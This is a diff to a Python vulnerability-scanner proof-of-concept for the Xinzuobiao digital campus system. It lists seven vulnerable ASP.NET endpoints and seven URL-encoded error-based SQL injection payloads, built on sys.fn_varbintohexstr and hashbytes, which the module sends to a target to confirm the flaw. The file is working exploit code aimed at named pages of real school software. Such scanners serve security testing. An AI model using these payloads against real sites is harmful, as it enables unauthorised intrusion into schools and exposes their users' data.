@@ -5,11 +5,19 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
     vuln_id = 'xinzuobiao_0002' # 平台漏洞编号，留空
-    name = '新座标通用型数字校园系统多处SQL注射漏洞'  # 漏洞名称
+    name = '新座标通用型数字校园系统 SQL注射'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
     disclosure_date = '2014-07-21'  # 漏洞公布时间
     desc = '''
+        新座标通用型数字校园系统多处SQL注射漏洞。
+        /DPMA/FWeb/SchoolWeb/Class/ClassNotic.aspx
+        /dpma/FWeb/WorkRoomWeb/Web/Index.aspx
+        /dpma/FWeb/WorkRoomWeb/Web/TeacherAlbums_New.aspx
+        /dpma/FWeb/WorkRoomWeb/Web/TeacherBlogDetail.aspx
+        /dpma/FWeb/WorkRoomWeb/WebYRY/TeacherBlog.aspx
+        /DPMA/FWeb/SPEWeb/Web5/SPEVideosDetail.aspx
+        /dpma/FWeb/SchoolWeb/Web/AnnounAndNews.aspx
     '''  # 漏洞描述
     ref = ''  # 漏洞来源
     cnvd_id = ''  # cnvd漏洞编号
@@ -31,13 +39,13 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             
             payloads = [
-                'DPMA/FWeb/SchoolWeb/Class/ClassNotic.aspx?ClsID=4012&KindID=%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--',
-                'dpma/FWeb/WorkRoomWeb/Web/Index.aspx?TID=1%20AND%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',
-                'dpma/FWeb/WorkRoomWeb/Web/TeacherAlbums_New.aspx?tid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',
-                'dpma/FWeb/WorkRoomWeb/Web/TeacherBlogDetail.aspx?tid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))&diaryId=1000',
-                'dpma/FWeb/WorkRoomWeb/WebYRY/TeacherBlog.aspx?tid=1%20%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',
-                'DPMA/FWeb/SPEWeb/Web5/SPEVideosDetail.aspx?KindSetID=30000&VideoID=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--',
-                'dpma/FWeb/SchoolWeb/Web/AnnounAndNews.aspx?Type_Anews=1&sid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))&diaryId=1000'
+                '/DPMA/FWeb/SchoolWeb/Class/ClassNotic.aspx?ClsID=4012&KindID=%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--',
+                '/dpma/FWeb/WorkRoomWeb/Web/Index.aspx?TID=1%20AND%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',
+                '/dpma/FWeb/WorkRoomWeb/Web/TeacherAlbums_New.aspx?tid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',
+                '/dpma/FWeb/WorkRoomWeb/Web/TeacherBlogDetail.aspx?tid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))&diaryId=1000',
+                '/dpma/FWeb/WorkRoomWeb/WebYRY/TeacherBlog.aspx?tid=1%20%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',
+                '/DPMA/FWeb/SPEWeb/Web5/SPEVideosDetail.aspx?KindSetID=30000&VideoID=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--',
+                '/dpma/FWeb/SchoolWeb/Web/AnnounAndNews.aspx?Type_Anews=1&sid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))&diaryId=1000'
             ]
             for payload in payloads:
                 verify_url = self.target + payload
